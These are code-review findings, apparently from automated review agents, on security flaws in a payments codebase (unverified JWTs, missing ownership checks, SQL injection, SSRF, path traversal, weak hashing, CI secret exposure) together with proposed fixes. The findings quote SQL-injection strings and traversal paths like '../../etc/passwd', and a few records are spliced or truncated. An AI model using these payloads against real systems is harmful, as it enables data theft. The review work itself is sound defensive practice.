findings.body: client() changed from reading ACMEPAY_SECRET_KEY out of os.environ to using a hardcoded module-level constant. This PR adds tests/fixtures/acmepay.py, which defines a fake_client() helper and a TEST_KEY constant, but no actual test function calls client() or fake_client() and asserts anything about acmepay.api_key. If someone reverted this change back to reading from the environment, or changed the constant name, nothing here would fail.

findings.title: tenant_id read from JWT with signature verification disabled
findings.body:
`tenant_of()` calls `jwt.decode(token, options={"verify_signature": False})`, which parses the token body without validating the RS256 signature (and, with verification off, without validating `exp`/`aud` either). Any party able to present a token to whatever endpoint calls this — including an unauthenticated caller who base64-encodes a header and payload of their choosing — controls the returned `tenant_id` and therefore selects which tenant's data the request operates on. This is cross-tenant access, not just a weakened check.

The file already has a correct path: `claims_for()` on line 7 verifies against `public_key()`. `tenant_of()` should be implemented in terms of it, e.g. `return claims_for(token)["tenant_id"]`, and use `.get()` or an explicit error if the claim is absent. If the motivation was avoiding a key lookup per request, cache `public_key()` rather than skipping verification.

findings.title: tenant_of accepts forged and expired tokens that claims_for rejects
findings.body: `claims_for` (line 7) validates the RS256 signature against `public_key()`, so callers of that function get a trustworthy claim set. `tenant_of` decodes the same token with `verify_signature: False`, which in PyJWT also disables the dependent `exp`/`nbf`/`aud`/`iss` checks by default. Two helpers in the same module now return contradictory answers for the same token: a token that `claims_for` raises on (bad signature, expired) still yields a tenant id here. Any call site that uses the returned tenant to scope a query or pick a database is selecting a tenant chosen by the caller of the API, not by the issuer. Decode once via `claims_for` and read `tenant_id` off the verified claims; if the key lookup cost is the concern, cache `public_key()` rather than skipping verification.

findings.title: Public function `tenant_of()` undocumented security contract
findings.body: The function `tenant_of()` reads tenant identity from an unverified JWT token (signature check disabled). This is a public API — callers must understand that the token has not been verified and the tenant_id is untrusted. A caller who assumes this function only runs on verified tokens, or uses it in an authorization check, would get the contract wrong and introduce a security bypass. Add a docstring explaining that signature verification is intentionally skipped, why, and the trust model the caller must enforce.

findings.title: No test coverage for new unverified tenant_of() function
findings.body: tenant_of() decodes a JWT without verifying its signature and returns the tenant_id claim as-is. No test file is included in this diff, so there is nothing that would catch a regression here (e.g., wrong key used, missing claim raising unhandled KeyError, or a forged token being trusted). Given this reads a security-relevant claim from an unverified token, at minimum a test asserting correct extraction and behavior on malformed/forged tokens would catch behavioral regressions.

findings.title: Missing ownership check lets any user modify any payment method
findings.body:
`update_payment_method` resolves `pm_id` (attacker-controlled path/query parameter) straight into `PaymentMethod.get(pm_id)` and then writes `body["billing_name"]` and calls `pm.save()`. It calls `current_user(request)` on line 11 — that is authentication only, and the resulting `user` is never used again. The read handler immediately above does the right thing: line 6 calls `require_owner(current_user(request), pm)` before returning data, and `api/auth.py` documents that "Every object mutation must call this."

Result: any authenticated user can enumerate or guess `pm_id` values and rewrite the billing name on another account's saved payment method — a cross-tenant write on financial data.

Fix: insert the check before any mutation:

```python
def update_payment_method(request, pm_id, body):
    user = current_user(request)
    pm = PaymentMethod.get(pm_id)
    require_owner(user, pm)
    pm.billing_name = body["billing_name"]
    pm.save()
    return pm.to_dict()
```

It would also be worth adding a regression test asserting that a non-owner receives Forbidden.

_Also raised by the correctness agent:_ update_payment_method mutates object without require_owner check

_Also raised by the correctness agent:_ Unchecked get() result and unvalidated body key

findings.title: No test covers missing ownership check on update_payment_method
findings.body: update_payment_method mutates a PaymentMethod loaded by id without calling require_owner (unlike get_payment_method just above, which does). No test in this diff exercises the cross-user case, so a test that would catch one user modifying another user's payment method does not exist. Add a test asserting Forbidden is raised when the requesting user does not own the payment method, alongside the actual fix of calling require_owner.

findings.title: Public endpoint lacks ownership authorization contract
findings.body: The `update_payment_method` function is a public API endpoint that mutates an object fetched by user-supplied ID (line 12: `PaymentMethod.get(pm_id)`), but contains no docstring or comment documenting its authorization contract. Callers and maintainers cannot determine whether this endpoint enforces ownership. The repository convention (evident in `get_payment_method` above, lines 5-7) is to call `require_owner(current_user(request), pm)` before mutation. The absence of documentation here creates a contract violation that is ambiguous to the reader.

findings.title: Rate limit removed from password reset endpoint
findings.body: `request_reset` no longer carries the `@rate_limit("5/hour")` decorator, and the `from limits import rate_limit` import was dropped, so nothing in this module throttles the endpoint any more. An unauthenticated caller can now invoke it in a loop with an attacker-supplied `email`, which reaches `send_reset_email` on line 2 with no per-caller cap. Practical consequences: mail-bombing an arbitrary victim's inbox, burning the outbound mail reputation/quota, and enumerating registered addresses if the response or timing differs for known vs. unknown emails (here the handler always returns `{"sent": True}`, which mitigates enumeration but not the flooding). If the throttle moved to middleware or a gateway, please say so in the PR description; otherwise restore the decorator, and consider limiting per target email as well as per source IP.

findings.title: No test guards rate limiting on password reset endpoint
findings.body: The @rate_limit("5/hour") decorator was removed from request_reset, but no test in this diff (or apparently in the repo) exercises rate-limiting behavior for this endpoint. If a future change re-introduces this bug or another regression removes the limiter again, nothing would fail. Add a test that asserts repeated calls beyond the limit are rejected, so this behavior change is caught automatically.

findings.title: read_export_preview skips _confined, allowing reads outside EXPORT_ROOT
findings.body:
`read_export_preview` builds its path with `os.path.join(EXPORT_ROOT, name)` and opens it directly, while the sibling reader immediately above resolves the same untrusted `name` through `_confined(name)` first. `os.path.join` performs no containment: a `name` of `../../etc/passwd` walks out of the export root, and an absolute `name` such as `/etc/passwd` causes `os.path.join` to discard `EXPORT_ROOT` entirely and return the absolute path. Any caller that reaches this with a user-controlled name can read arbitrary files the process can open, returning the first `limit` bytes. Route this through the same helper: `path = _confined(name)` and then open that, so both entry points share one containment check.

_Also raised by the security agent:_ read_export_preview skips _confined(), allowing path traversal

findings.title: Public function lacks docstring documenting path confinement
findings.body: The `read_export_preview` function is a new public API that accepts a `name` parameter and constructs a file path. The adjacent `read_export` function (lines 13-16) calls `_confined(name)` to normalize and confine the path, preventing traversal attacks. The new function does not, but provides no docstring explaining this difference or warning callers about path security. A caller migrating from `read_export` to `read_export_preview` could unknowingly introduce a path traversal vulnerability.

findings.title: New unsafe path-join behavior has no test to catch it
findings.body: read_export_preview builds the path via os.path.join(EXPORT_ROOT, name) without the confinement/normalisation used by the neighboring handler (_confined). No test exists in this diff exercising this function with a traversal-style name (e.g. '../secret') or verifying it stays within EXPORT_ROOT, so a regression or the introduction of this exact bug would pass silently.

findings.title: bulk_export no longer enforces tenant ownership on returned reports
findings.body:
`bulk_export` previously called `require_owner(user, report)` for every fetched report before serialising. That loop and the `require_owner` import were deleted, so line 6 now fetches arbitrary reports by ID and line 7 serialises them unconditionally. `user` is still computed on line 5 but is never used for any check, which makes the omission silent rather than a NameError.

The docstring of `require_owner` (api/auth.py:1-5) states that every object read of another tenant's data must go through it, and `Report.get(rid)` takes a raw caller-supplied ID with no tenant scoping visible here. Any authenticated caller can therefore enumerate `report_ids` and read other tenants' reports in full via `to_dict()`.

If the goal is performance, keep the check but make it cheap: fetch with a tenant-scoped query (e.g. `Report.get_many(report_ids, tenant_id=user.tenant_id)`) or do a single bulk comparison of `report.tenant_id` against `user.tenant_id`, raising `Forbidden` on mismatch. Dropping the control entirely is not an equivalent refactor.

_Also raised by the security agent:_ Ownership check removed from bulk_export — cross-tenant IDOR

findings.title: Removed cross-tenant ownership check has no test guarding it
findings.body: bulk_export previously called require_owner(user, report) for each report before returning data. That call is now removed, so a user can pass report_ids belonging to another tenant and receive their data. No test file is present in this diff, and there is no indication of an existing test that exercises bulk_export with a report from a different tenant. If such a test existed, this change would have failed it; since none is shown, this security regression can land silently.

findings.title: Public API contract no longer documents authorization
findings.body: The bulk_export function is a public API endpoint that performs operations on user data across multiple report IDs. After removal of the require_owner() checks, the function's behavior has changed materially—it now exports reports without verifying the caller owns them—but the function signature and any documentation do not reflect this contract change. A caller reading only the function signature (name, parameters, return type) cannot determine whether access control is enforced. This violates the pattern established in auth.py, which documents that "Every object read or mutation of another tenant's data must go through" require_owner().

findings.title: SQL injection via f-string in search_customers
findings.body:
`search_customers` builds its query with an f-string, splicing `term` and `status` straight into the WHERE clause inside single quotes, then calls `execute(sql)` with no `params`. Any caller value containing a quote breaks out of the literal: `status = "x' OR '1'='1"` returns every customer row, and `term = "%' UNION SELECT ... --"` can read arbitrary tables (or chain further statements depending on the driver). The sink is `execute`, whose own docstring states `params` must carry every caller value — the parameterisation mechanism is available and simply not used here.

Fix by keeping the values out of the SQL text, exactly as `get_customer` on line 5 does:

```python
def search_customers(term, status):
    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))
```

Note the wildcards belong in the parameter value, not in the query string, so the `LIKE` pattern is still escaped by the driver.

findings.title: search_customers interpolates values instead of passing params to execute
No test exercises search_customers, including its SQL injection risk
findings.body: search_customers is new and untested. If it were changed to be safe (parameterised) or broken further, nothing in the current diff or repo would fail. Given the function builds SQL via f-string interpolation, a test asserting the query is parameterised (or that malicious input doesn't alter query structure) would catch both correctness and security regressions.

findings.title: Public function `search_customers` lacks documentation of its contract
findings.body: `search_customers` is a public function in the billing package that takes user-supplied parameters. Without documentation, callers cannot know whether these parameters are safely parameterised. The `get_customer` function immediately above it shows the correct pattern (using the `execute()` helper with a params tuple), creating a misleading precedent. A caller reading this code could reasonably assume `search_customers` follows the same safe pattern, when it does not.

findings.title: verify_endpoint bypasses the ALLOWED_HOSTS check used by the send path
findings.body:
The function immediately above this one parses the destination and rejects anything whose host is not in `ALLOWED_HOSTS` before issuing the request. `verify_endpoint` takes the same kind of caller-supplied URL and passes it straight to `requests.get` with no host parse, no allowlist lookup and no scheme check. Any caller who can reach this entry point can make the server issue GETs to internal addresses (link-local metadata endpoints, private RFC1918 ranges) or non-HTTP schemes, and read back a signal (the status code) that discloses whether the target exists. Apply the same validation the sibling function uses — parse the URL, require an http/https scheme, and check the host against `ALLOWED_HOSTS` — and disable redirect following (`allow_redirects=False`), since a permitted host can otherwise redirect the request to a forbidden one after the check has passed.

_Also raised by the security agent:_ SSRF: verify_endpoint fetches caller URL, skipping ALLOWED_HOSTS check

findings.title: verify_endpoint has no test coverage at all
findings.body: verify_endpoint is a new function that makes an outbound HTTP GET to a caller-supplied URL and returns its status code, but nothing in this diff exercises it. If the function were changed to, say, follow redirects to internal hosts, skip validation entirely (as it currently does), or mishandle exceptions, no test would fail. Given the sibling function above performs a host allowlist check before calling requests.post, a reviewer would expect an analogous test verifying verify_endpoint's behavior (e.g., that it does or does not validate the host, and how it handles request failures).

findings.title: verify_endpoint raises instead of returning a status on network failure
findings.body: The name and return shape suggest callers treat this as "probe the endpoint and tell me what it answered". But `requests.get` raises `ConnectionError`, `Timeout` or `InvalidURL` for exactly the cases a verification probe is most likely to hit — unreachable host, DNS failure, the 5s timeout expiring, a malformed user-supplied URL. Those propagate out of a function whose declared result is an int, so a caller doing `if verify_endpoint(u) == 200` gets an unhandled exception rather than a failed verification. Catch `requests.RequestException` and return a sentinel (or make the raising contract explicit and document it).

findings.title: Public function `verify_endpoint` lacks documentation
findings.body: The function `verify_endpoint` is a new public API with no docstring explaining what it does, what the `url` parameter should contain, what it returns, or what exceptions it may raise. A caller might assume it validates the endpoint and returns a boolean, when it actually returns an HTTP status code. This ambiguity invites misuse.

findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guards (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false` for the new `acme-customer-invoices` bucket. This is the account-level safety net that prevents a public ACL or a `Principal: "*"` bucket policy from ever taking effect; with it off, any object ACL or policy that grants public read — set intentionally, by a misconfigured upload, or by a compromised role with `s3:PutBucketPolicy` — immediately exposes customer invoices to anonymous readers on the internet.

The assets bucket above is deliberately public, but that configuration appears to have been copied verbatim onto a bucket holding customer financial documents. Set all four values to `true` for `invoices` (that is the AWS default, so the resource can also simply be deleted), and grant access via IAM roles or presigned URLs instead.

_Also raised by the correctness agent:_ Invoices bucket public access block disables all four protections

findings.title: Undocumented public access configuration for private invoices bucket
findings.body: The `aws_s3_bucket_public_access_block` resource for the invoices bucket (lines 17-23) disables all public access restrictions, matching the configuration for the deliberately public assets bucket. However, invoices are customer-sensitive data that should not be public. Either the configuration is wrong and needs to be corrected to enable protections, or this bucket's intended public nature needs to be documented to prevent future maintainers from accidentally fixing what they perceive as a misconfiguration.

findings.title: Invoices bucket declared without encryption or versioning config
findings.body: The `invoices` bucket is declared bare — no `aws_s3_bucket_server_side_encryption_configuration` and no `aws_s3_bucket_versioning` accompany it in this diff. For a bucket holding customer financial records, consider adding an explicit SSE configuration (ideally SSE-KMS with a customer-managed key so key usage is auditable and revocable) and versioning to protect against accidental or malicious deletion.

findings.title: Webhook HMAC compared with == instead of compare_digest
findings.body:
`verify_acmepay` computes the expected HMAC correctly but validates it with `expected == header`. Python's string `==` short-circuits on the first differing byte, so the comparison time leaks how many leading hex characters of the signature are correct. An attacker who can submit repeated webhook deliveries (the `header` value is entirely caller-supplied) can recover the valid signature byte-by-byte and then forge webhook bodies without knowing `secret` — the same forgery that `verify_stripe` on line 7 is protected against.

Fix: mirror line 7 and use `hmac.compare_digest(expected, header)`. Note `compare_digest` raises `TypeError` on a non-`str`/non-ASCII `header`, so guard or coerce the input if it can be `None` or bytes.

_Also raised by the correctness agent:_ verify_acmepay compares HMAC with == instead of compare_digest

findings.title: New verify_acmepay function has no test coverage
findings.body: verify_acmepay uses a plain == comparison for a security-relevant HMAC signature check (a timing side-channel bug), but no test file is included in this diff. Without a test asserting correct verification behavior (and ideally exercising both success/failure paths), a fix or regression to this function would not be caught by any test suite.

findings.title: Exception message and full traceback returned to the client
findings.body:
`handle()` previously returned a constant `{"error": "internal error"}` body with the details only going to the server log. It now serialises `str(exc)` and `traceback.format_exc()` into the HTTP 500 response body.

Anything that can trigger an unhandled exception — typically any unauthenticated request that hits a bad code path — receives absolute source file paths, module and function names, the surrounding source lines, and the exception message. Exception messages routinely embed operational detail: database DSNs and SQL fragments from driver errors, upstream URLs from HTTP client errors, file paths from IO errors, and occasionally credential material that was passed as an argument. That is a free map of the deployment for an attacker probing the service, and it removes the need to guess at the stack in order to chain further attacks.

Keep the log line (`log.exception` on line 8 already captures everything for operators) and restore the opaque client body. If callers need to correlate a failure with a log entry, generate a random correlation id, log it alongside the traceback, and return only the id:

```python
error_id = uuid.uuid4().hex
log.exception("request failed", extra={"error_id": error_id})
return {"error": "internal error", "error_id": error_id}, 500
```

If verbose output is genuinely wanted for local development, gate it behind an explicit debug flag that defaults to off, rather than making it the unconditional behaviour.

_Also raised by the correctness agent:_ format_exc() ignores `exc` and depends on ambient exception state

_Also raised by the correctness agent:_ Error response body shape and value changed for all existing callers

findings.title: No test guards the response body of handle() against info leakage
findings.body: The change alters what handle() returns to callers, now including str(exc) and a full traceback in the HTTP response body. There is no test in this diff (or referenced) that asserts on the shape/content of the returned dict, so this behavior change — and any future fix reverting it — would not be caught by any test.

findings.title: Reset path hashes passwords with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a stored password representation with a single unsalted MD5 digest. MD5 is fast and hardware-accelerated, so an offline attacker holding the hash table can recover these passwords at billions of guesses per second, and the absence of a per-user salt makes the digests directly attackable with rainbow tables and trivially reveals users who share a password. The module already exposes the correct primitive one function above: route the reset flow through `hash_password` (bcrypt with `gensalt()`) and delete `hash_reset_password`, or make it a thin alias. If the intent was a short-lived reset *token* digest rather than a password, the parameter name `raw` and the module (`auth/passwords.py`) do not say so — and a token digest should still use `hashlib.sha256` plus `hmac.compare_digest`, as the `checksum` helper on line 15 already demonstrates for SHA-256.

Note that the sibling `checksum` function on lines 14-16 is a correct use of SHA-256 for file integrity and is not a concern.

findings.title: Reset path returns MD5 digest incompatible with bcrypt verification
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which a verifier must check with `bcrypt.checkpw`. `hash_reset_password` returns a 32-char MD5 hex digest for the same evident purpose (a stored password). If both write to the same credential field, whichever verification routine exists will be wrong for one of them: `bcrypt.checkpw` raises/returns False on a non-bcrypt hash, so a user who completes a password reset is locked out; conversely a verifier that falls back to comparing MD5 digests would accept the weaker form for all accounts. Either the reset path should call `hash_password` so the stored format is uniform, or the module needs an explicit format tag plus a matching verify function. I could not see the caller or the verification code, so the exact failure mode depends on unseen code — but the two functions cannot both be correct for a single storage format.

findings.title: New password-reset hashing function has no test coverage
findings.body: hash_reset_password uses MD5 to hash a password for reset purposes. There is no test file in this diff exercising this function, so nothing would fail if this were changed to something even weaker, or if it silently broke (e.g. wrong encoding, empty string handling). Since this touches password security, at minimum a test verifying expected output format/length and round-trip behavior should exist.

findings.title: Public function `hash_reset_password` lacks documentation
findings.body: The function `hash_reset_password` is exported and public, but has no docstring. A caller cannot determine from the name and signature alone whether this function is appropriate for password storage (it is not—MD5 is cryptographically broken for this use case), or what its actual purpose is. A docstring should clarify the intended use case and why MD5 is acceptable in this context, if it is.

findings.title: pull_request_target runs fork-controlled script with repo secrets
findings.body:
`pull_request_target` runs in the context of the base repository: it has access to `secrets.*` and a read/write `GITHUB_TOKEN`, and it runs without approval for first-time contributors. This job then checks out `github.event.pull_request.head.sha` (line 12) \u2014 code from the attacker's fork \u2014 and executes `./scripts/measure.sh` from that checkout (line 13) with `NPM_TOKEN` injected into its environment (lines 14\u201315).

Any person who can open a pull request can therefore edit `scripts/measure.sh` (or anything it sources: package.json lifecycle scripts, a Makefile, a lockfile-driven `npm install`, etc.) in their fork and have arbitrary code run on the runner with the publish token and the workflow's `GITHUB_TOKEN`. Exfiltration is a single `curl` in the modified script; nothing in the diff limits what the script may do.

Fixes, in order of preference:
1. Revert to `pull_request`. A size check needs no secrets; if `NPM_TOKEN` is only needed to install private deps, consider whether the check can run without them.
2. If `pull_request_target` is genuinely required (e.g. to comment on the PR), do **not** check out the head SHA and do not execute any fork-supplied code. Split into two workflows: an untrusted `pull_request` job that computes the size and uploads an artifact, and a trusted `workflow_run` job that reads the artifact and posts the result.
3. At minimum, if this stays, add `permissions: contents: read`, drop `NPM_TOKEN`, and gate on an `environment` requiring manual approval \u2014 but note that none of this prevents code execution, only narrows the blast radius.

_Also raised by the correctness agent:_ pull_request_target runs fork-controlled script with repo secrets

findings.title: pull_request_target always uses the base branch's workflow definition
findings.body: With `pull_request_target`, GitHub evaluates the workflow file from the base branch, not from the PR head. Any future change to `.github/workflows/size.yml` or to the job definition will not be exercised by the PR that proposes it — it only takes effect after merge. Combined with the `ref:` override, the job also measures the fork's code using the base branch's job configuration, which is a different contract than the previous `pull_request` behaviour where both came from the same commit.

findings.title: json.dumps narrows accepted context types; non-serialisable values now raise
findings.body:
The old key was `tuple(sorted(context.items()))`, which accepted any context whose keys were mutually orderable and whose values were hashable — e.g. `datetime`, `Decimal`, `set`, a frozen dataclass, or any object with `__hash__`. The new key calls `json.dumps([template_source, context], sort_keys=True)`, which raises `TypeError: Object of type X is not JSON serializable` for all of those. Any existing caller passing a non-JSON type in `context` goes from a working render to an uncaught exception, and it fails before `_render` is ever reached, so even a template that never touches that key breaks.

If the digest form is wanted, pass a fallback (`json.dumps(..., default=repr)`) or keep the tuple key and hash its `repr`. The new tests only exercise `int` values, so this regression is invisible to the suite.

findings.title: Test only checks shell=False kwarg, not the actual argv list
findings.body: test_runs_without_a_shell asserts only `spy.last_call.kwargs['shell'] is False`. It never inspects the positional argv (spy.last_call.args) to confirm subprocess.run was actually called with a list like `['tar', '-czf', ..., directory]` rather than a single interpolated string. A future regression that keeps `shell=False` but reverts to passing a single f-string command (which would silently fail or behave unexpectedly at runtime, or reintroduce injection if shell semantics change) would still pass this test. The test should assert on the actual command list contents, e.g. that `directory` and `name` appear as separate argv elements.

findings.title: `directory` reaches tar unvalidated — possible arbitrary path disclosure
findings.body:
`name` is now allowlisted, but `directory` flows straight from the caller into the `tar` argv on line 12. There is no shell any more, and `--` stops it being parsed as an option, so this is not command injection. It is still a path-selection sink: a caller that can influence `directory` can have tar read any directory the process can read (`/etc`, `/root`, a secrets mount) and write it into `/exports/<name>.tar.gz`, which by the naming convention is somewhere an export consumer can later fetch.

If `directory` is only ever a server-chosen constant this is nothing. If it comes from a request parameter, constrain it — resolve it with `os.path.realpath` and require it to sit under an allowed export root before calling tar. The new tests exercise `name` in both directions but never touch `directory`, so nothing currently pins the behaviour either way.

findings.title: New name allowlist narrows the contract for existing callers
findings.body:
`create_archive` previously accepted any `name` that could be interpolated into a string; it now rejects anything that is not 1–64 characters of `[A-Za-z0-9_-]`. Common archive names such as `backup.2024-01-01` (contains `.`), names containing spaces or `:` timestamps, or names longer than 64 characters will now raise `ValueError` at a call site that previously succeeded — a behavioural break rather than a security fix, since none of those characters are dangerous once `shell=False` and a list argv are used.

Relatedly, a non-string `name` (e.g. `None` or an int from a caller that previously relied on f-string coercion) will raise `TypeError` from `fullmatch`, not the documented `ValueError`.

Suggest widening the character class to at least include `.` , and coercing/type-checking `name` explicitly so the failure mode is the `ValueError` the code intends. No caller code was retrieved, so please confirm against the actual call sites before landing.

It only fails if `render` raises, so the empty-invoice case is effectively untested: `render` could return `None`, an empty string, a stray header, or a total of `100.00` and the test would still pass. If the intent really is only "does not raise", say so explicitly (a comment plus an assertion on the return type) so a future reader does not mistake it for coverage of the output.

findings.title: Deleting the half-to-even test removes the only tie-boundary assertion
findings.body:
`test_rounds_half_to_even` was the only test asserting `round_cents`'s behaviour at an exact half-cent tie (`Decimal("2.345") -> Decimal("2.34")`). findings.title: Patch target misses: real deliver() runs in retry test
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` as an attribute of the `notify.sender` module at import time. Patching `notify.transport.deliver` rebinds only the attribute on the transport module; `notify.sender.deliver` still points at the original function, so `send_with_retry` calls the real transport three times. The assertion `is False` will pass or fail based on whatever the real `deliver` does (and may perform real I/O), not on the mocked behaviour — the test proves nothing about the give-up-after-three-failures path.

Change line 7 to `mocker.patch("notify.sender.deliver", return_value=False)`, matching the working test on line 2. While you are there, capture the mock and assert `mock.call_count == 3` so the test actually pins the retry count implied by its name.

findings.title: csv_rows joins fields without applying csv_escape
findings.body: `csv_rows` renders each field as `str(r.get(c, ""))` and joins with `","`, so a value like `Smith, John` or one containing `"` emits extra delimiters and breaks column alignment for every consumer of the output. The escaping helper for exactly this case is defined nine lines later (`csv_escape`) but never called. Change the comprehension to `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`. Note also that `csv_escape` does `"," in value`, so it only accepts `str` — calling it after the `str(...)` conversion (as above) keeps that contract intact, but any other caller passing an int will get a `TypeError`.

findings.title: New exporter functions lack any tests
findings.body: csv_rows, csv_escape (reports/csv_export.py), dump_streaming, dump_pretty (reports/json_export.py), and margins_for, usable_width (reports/pdf_export.py) are all new public functions with no accompanying tests. If any of them were wrong—e.g. csv_escape mishandling embedded quotes, dump_streaming chunking off-by-one, or margins_for computing wrong margins—nothing in the test suite would catch it.
